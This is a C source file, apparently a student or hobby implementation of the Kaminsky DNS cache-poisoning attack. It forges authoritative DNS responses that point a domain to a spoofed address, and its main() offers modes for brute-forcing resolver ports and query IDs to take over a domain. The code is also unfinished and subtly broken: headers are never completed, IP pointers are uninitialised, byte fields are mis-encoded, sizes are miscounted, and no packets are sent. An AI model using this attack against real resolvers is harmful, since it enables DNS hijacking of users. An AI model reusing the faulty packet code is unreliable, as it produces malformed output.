//
// Kaminsky Attack
//
// 06/11/2022
// 
// Xu Hang
//
// Ref:
// http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html
// https://docstore.mik.ua/orelly/networking_2ndEd/dns/appa_02.htm
//



#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<winsock2.h>

#define DNS_SIZE 65526

// IP Header
struct IP_HEADER
{
    unsigned char _VER;
    unsigned char _HL;
    unsigned char _TOS;

    unsigned short _TL;
    unsigned short _IDENT;
    unsigned char _FLAG;
    unsigned short _OFFSET;
    
    unsigned char _TTL;
    unsigned char _PROTOCAL;
    unsigned short _CHECKSUM;
    
    unsigned int _IP_SOURCE;
    unsigned short _IP_DEST;
    
};


// UDP Header
struct UDP_HEADER
{
    unsigned short _SOURCE;
    unsigned short _DEST;
    unsigned short _LENGTH;
    unsigned short _CHKSUM;

};


// DNS Header
struct DNS_HEADER
{
    unsigned short _ID;

    unsigned char _QR;
    unsigned char _OPCODE;
    unsigned char _AA;
    unsigned char _TC;
    unsigned char _RD;
    unsigned char _RA;
    unsigned char _Z;
    unsigned char _RCODE;

    unsigned short _QDCOUNT;
    unsigned short _ANCOUNT;
    unsigned short _NSCOUNT;
    unsigned short _ARCOUNT;

};

// DNS Question Body
struct DNS_QUESTION
{
    unsigned short _QTYPE;
    unsigned short _QCLASS;
};



// DNS Answer, Authority, Additional Body 
struct DNS_AAA
{	
	unsigned short _TYPE;
	unsigned short _CLASS;
	unsigned int _TTL;
	unsigned short _RDLEN;
};

// Init DNS Response
int DNS_Response_INIT(  char * buffer,int p_sor_port,int p_des_port,char * p_spoofed_addr,
                        char * p_question,int p_QID,int p_question_count,int p_answer_count,int p_authority_count,int p_additional_count,
                        char * p_answer_content,char * p_authority_content, char * p_additional_content){

    /*** Pointer to start of different section ***/
    struct IP_HEADER * ip_header = (struct IP_HEADER *) buffer;
	struct UDP_HEADER * udp_header = (struct UDP_HEADER *) (buffer + sizeof(struct IP_HEADER));
    struct DNS_HEADER * dns_header = (struct DNS_HEADER *)(buffer + sizeof(struct IP_HEADER) +  sizeof(struct UDP_HEADER));

    /******************** DNS ********************/


    int dns_length = sizeof(dns_header);
    // HEADER SECTION
    dns_header->_ID = htons(p_QID);
    
    dns_header->_QR = htons(1); // Set to 0 for a query by a client, 1 for a response from a server
    dns_header->_OPCODE = htons(0); // Set by client to 0 for a standard query; the other types aren't used in our examples
    dns_header->_AA = htons(1); // Set to 1 in a server response if this answer is Authoritative, 0 if not.
    dns_header->_TC = htons(0); // Set to 1 in a server response if the answer can't fit in the 512-byte limit of a UDP packet response; this means the client will need to try again with a TCP query, which doesn't have the same limits.
    dns_header->_RD = htons(0); // The client sets this to 1 if it wishes that the server will perform the entire lookup of the name recursively, or 0 if it just wants the best information the server has and the client will continue with the iterative query on its own.
    dns_header->_RA = htons(0); // The server sets this to indicate that it will (1) or won't (0) support recursion.
    dns_header->_Z = htons(0); // This is reserved and must be zero
    dns_header->_RCODE = htons(0); // Response code from the server: indicates success or failure

    dns_header->_QDCOUNT = htons(p_question_count); // The client fills in the next section with a single "question" record that specifies what it's looking for: it includes the name (www.unixwiz.net), the type (A, NS, MX, etc.), and the class (virtually always IN=Internet).
                                    // The server repeats the question in the response packet, so the question count is almost always 1.
    dns_header->_ANCOUNT = htons(p_answer_count); // An unsigned 16 bit integer specifying the number of entries in the question section.
    dns_header->_NSCOUNT = htons(p_authority_count); // An unsigned 16() bit integer specifying the number of name server resource records in the authority records section.
    dns_header->_ARCOUNT = htons(p_additional_count); // An unsigned 16 bit integer specifying the number of resource records in the additional records section.



    // QUESTION SECTION
    // QUESTION = NAME + BODY
    char * dns_question_name =(char *)&dns_header[sizeof(struct DNS_HEADER)];
    strcpy(dns_question_name,p_question);
    int question_length = strlen(dns_question_name)+1;
    
    struct DNS_QUESTION * dns_question_body = (struct DNS_QUESTION *)(dns_question_name + question_length);
    dns_question_body->_QTYPE = htons(1); // A two octet code which specifies the type of the query. The values for this field include all codes valid for a TYPE field, together with some more general codes which can match more than one type of RR.
    dns_question_body->_QCLASS = htons(1); // A two octet code that specifies the class of the query. For example, the QCLASS field is IN for the Internet docstore.

    dns_length += question_length;
    dns_length += sizeof(dns_question_body);

    // ANSWER SECTION
    // NAME + BODY + RDATA
    unsigned int* answer_rdata = (unsigned int *)&dns_question_body[sizeof(struct DNS_QUESTION)];
    if(p_answer_count > 0){
        
        // Compressed domain name, point to offset domian name on question section
        // Pointer Format 2 byte
        unsigned short * dns_answer_name = (unsigned short *)&dns_question_body[sizeof(struct DNS_QUESTION)];
        * dns_answer_name = htons(0xC00C);
        dns_answer_name += 2;

        struct DNS_AAA * answer_body = (struct DNS_AAA *) dns_answer_name;
        answer_body ->_TYPE = htons(1); // Two octets containing one of the RR type codes. This field specifies the meaning of the data in the RDATA field.
        answer_body ->_CLASS = htons(1); // Two octets which specify the class of the data in the RDATA field docstore.
        answer_body ->_TTL = htons(999999); // Time to live
        answer_body ->_RDLEN = htons(4); // An unsigned 16 bit integer that specifies the length in octets of the RDATA field.

        unsigned int* answer_rdata = (unsigned int*)&answer_body[sizeof(struct DNS_AAA )];
        * answer_rdata = inet_addr(p_spoofed_addr);
        answer_rdata += 4; 
        dns_length = dns_length + 6 +sizeof(answer_body);
    }


    // AUTHROITY SECTION
    // NAME + BODY + RDATA
    unsigned int* authority_rdata = (unsigned int*)&dns_question_body[sizeof(struct DNS_QUESTION)];
    if(p_authority_count > 0){
        // Compressed domain name, point to offset domian name on question section
        // Pointer Format 2 byte
        unsigned short * dns_authority_name = (unsigned short *)answer_rdata;
        * dns_authority_name = htons(0xC00C);
        dns_authority_name += 2;

        struct DNS_AAA * authority_body = (struct DNS_AAA *) dns_authority_name;
        authority_body ->_TYPE = htons(1); // Two octets containing one of the RR type codes. This field specifies the meaning of the data in the RDATA field.
        authority_body ->_CLASS = htons(1); // Two octets which specify the class of the data in the RDATA field docstore.
        authority_body ->_TTL = htons(999999); // Time to live
        authority_body ->_RDLEN = htons(4); // An unsigned 16 bit integer that specifies the length in octets of the RDATA field.

        authority_rdata = (unsigned int*)&authority_body[sizeof(struct DNS_AAA )];
        * authority_rdata = inet_addr(p_spoofed_addr);
        authority_rdata += 4; 
        
        dns_length = dns_length + 6 +sizeof(authority_body);
    }


    // ADDITION SECTION
    // NAME + BODY + RDATA
    unsigned int* additional_rdata = (unsigned int*)&dns_question_body[sizeof(struct DNS_QUESTION)];
    if(p_additional_count > 0){
        // Compressed domain name, point to offset domian name on question section
        // Pointer Format 2 byte
        unsigned short * dns_additional_name = (unsigned short *)authority_rdata;
        * dns_additional_name = htons(0xC00C);
        dns_additional_name += 2;

        struct DNS_AAA * additional_body = (struct DNS_AAA *) dns_additional_name;
        additional_body ->_TYPE = htons(1); // Two octets containing one of the RR type codes. This field specifies the meaning of the data in the RDATA field.
        additional_body ->_CLASS = htons(1); // Two octets which specify the class of the data in the RDATA field docstore.
        additional_body ->_TTL = htons(999999); // Time to live
        additional_body ->_RDLEN = htons(4); // An unsigned 16 bit integer that specifies the length in octets of the RDATA field.

        additional_rdata = (unsigned int*)&additional_body[sizeof(struct DNS_AAA )];
        * additional_rdata = inet_addr(p_spoofed_addr);
        additional_rdata += 4;

        dns_length = dns_length + 6 +sizeof(additional_body); 
    }


    /******************** UDP ********************/
    udp_header -> _SOURCE = htons(p_sor_port);
    udp_header -> _DEST = htons(p_des_port);
    udp_header ->_LENGTH = htons(additional_rdata - (unsigned int *)udp_header);


    /******************** IP  ********************/
    

}

// Init DNS Quetsion
int DNS_Quetion_INIT(  char * buffer,int des_port,char * p_spoofed_addr,
                        char * p_question,int p_QID,int p_question_count,int p_answer_count,int p_authority_count,int p_additional_count){

    /*** Pointer to start of different section ***/
    struct IP_HEADER * ip_header = (struct IP_HEADER *) buffer;
	struct UDP_HEADER * udp_response = (struct UDP_HEADER *) (buffer + sizeof(struct IP_HEADER));
    struct DNS_HEADER * dns_header = (struct DNS_HEADER *)(buffer + sizeof(struct IP_HEADER) +  sizeof(struct UDP_HEADER));

    /******************** DNS ********************/

    // HEADER SECTION
    dns_header->_ID = htons(p_QID);
    
    dns_header->_QR = htons(1); // Set to 0 for a query by a client, 1 for a response from a server
    dns_header->_OPCODE = htons(0); // Set by client to 0 for a standard query; the other types aren't used in our examples
    dns_header->_AA = htons(1); // Set to 1 in a server response if this answer is Authoritative, 0 if not.
    dns_header->_TC = htons(0); // Set to 1 in a server response if the answer can't fit in the 512-byte limit of a UDP packet response; this means the client will need to try again with a TCP query, which doesn't have the same limits.
    dns_header->_RD = htons(0); // The client sets this to 1 if it wishes that the server will perform the entire lookup of the name recursively, or 0 if it just wants the best information the server has and the client will continue with the iterative query on its own.
    dns_header->_RA = htons(0); // The server sets this to indicate that it will (1) or won't (0) support recursion.
    dns_header->_Z = htons(0); // This is reserved and must be zero
    dns_header->_RCODE = htons(0); // Response code from the server: indicates success or failure

    dns_header->_QDCOUNT = htons(p_question_count); // The client fills in the next section with a single "question" record that specifies what it's looking for: it includes the name (www.unixwiz.net), the type (A, NS, MX, etc.), and the class (virtually always IN=Internet).
                                    // The server repeats the question in the response packet, so the question count is almost always 1.
    dns_header->_ANCOUNT = htons(p_answer_count); // An unsigned 16 bit integer specifying the number of entries in the question section.
    dns_header->_NSCOUNT = htons(p_authority_count); // An unsigned 16() bit integer specifying the number of name server resource records in the authority records section.
    dns_header->_ARCOUNT = htons(p_additional_count); // An unsigned 16 bit integer specifying the number of resource records in the additional records section.

    // QUESTION SECTION
    // QUESTION = NAME + BODY
    char * dns_question_name =(char *)&dns_header[sizeof(struct DNS_HEADER)];
    strcpy(dns_question_name,p_question);
    int question_length = strlen(dns_question_name)+1;
    struct DNS_QUESTION * dns_question_body = (struct DNS_QUESTION *)(dns_question_name + question_length);
    dns_question_body->_QTYPE = htons(1); // A two octet code which specifies the type of the query. The values for this field include all codes valid for a TYPE field, together with some more general codes which can match more than one type of RR.
    dns_question_body->_QCLASS = htons(1); // A two octet code that specifies the class of the query. For example, the QCLASS field is IN for the Internet docstore.

}

int main(int argc,char ** argv){

    if(argc < 3){
        printf("Not Enough Argument!!");
        return 0;
    }


    // Assignment variable
    int part_number = 0;
    int resolver_port = 0;
    int query_ID = 0;
    int beginning_ID = 0;
    int end_ID = 0;
    int beginning_port = 0;
    char * domain;
    int end_port = 0;

    char * spoofed_addr = "1.2.3.4";

    int source_port = 80;
    part_number = atoi(argv[2]);



    // Socket 
    SOCKET socket_question,socket_response;

    // Windows socket
    WSADATA wsa;

    // Address
    struct sockaddr_in sin, din;
    
    memset(&sin, 0, sizeof(sin)); 
    memset(&din, 0, sizeof(din)); 

    // IP
    char * source_IP_addr;
    char * des_IP_addr;
    

    // INIT winsocket
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
	{
		printf("Failed. Error Code : %d",WSAGetLastError());
		exit(EXIT_FAILURE);
	}

    // CREATE socket
    socket_question = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
	socket_response = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(socket_question == INVALID_SOCKET || socket_response == INVALID_SOCKET)printf("Can not open socket");
    




    switch (part_number)
    {

    // Attack given port and ID
    case 1:
        /******************** Getting Argument ********************/
        if(argc < 4){
        printf("Not Enough Argument!!");
        return 0;
        }
        resolver_port = atoi(argv[3]);
        query_ID = atoi(argv[4]);


        // SET IPV4
        sin.sin_family = AF_INET;
	    din.sin_family = AF_INET;
        // Port 
	    sin.sin_port = htons(source_port);
	    din.sin_port = htons(resolver_port);
        // Address
        sin.sin_addr.s_addr = inet_addr(source_IP_addr);
	    din.sin_addr.s_addr = inet_addr(des_IP_addr);


        break;
    
    // Attack given port, ID range
    case 2:
        /******************** Getting Argument ********************/
        if(argc < 5){
        printf("Not Enough Argument!!");
        return 0;
        }
        resolver_port = atoi(argv[3]);
        beginning_ID = atoi(argv[4]);
        end_ID = atoi(argv[5]);




        break;
    
    // Attack given port, ID range, take over domain
    case 3:
        /******************** Getting Argument ********************/
        if(argc < 6){
        printf("Not Enough Argument!!");
        return 0;
        }
        resolver_port = atoi(argv[3]);
        beginning_ID = atoi(argv[4]);
        end_ID = atoi(argv[5]);
        domain = (char *)malloc(strlen(argv[6])*sizeof(char));
        domain = argv[6];




        break;
    
     // Attack given port range, port range, take over domain
    case 4:
        /******************** Getting Argument ********************/
        if(argc < 7){
        printf("Not Enough Argument!!");
        return 0;
        }
        beginning_port = atoi(argv[3]);
        beginning_ID = atoi(argv[4]);
        end_ID = atoi(argv[5]);
        domain = (char *)malloc(strlen(argv[6])*sizeof(char));
        domain = argv[6];
        end_port = atoi(argv[7]);



        break;
    
    default:
        break;
    }


    return 0;
}